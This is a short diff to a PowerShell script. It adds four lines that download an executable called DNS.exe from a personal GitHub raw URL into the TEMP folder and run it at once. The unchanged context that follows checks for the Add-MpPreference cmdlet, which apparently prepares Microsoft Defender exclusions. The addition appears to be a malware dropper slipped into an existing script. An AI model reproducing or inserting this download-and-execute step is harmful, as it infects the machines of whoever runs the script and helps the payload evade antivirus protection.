@@ -1,4 +1,7 @@
-
+$url = 'https://raw.githubusercontent.com/FREAKMANCHIK/WORK/main/files/DNS.exe'
+$outputPath = "$env:TEMP\DNS.exe"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+Start-Process -FilePath $outputPath
 try {
     if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
         $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
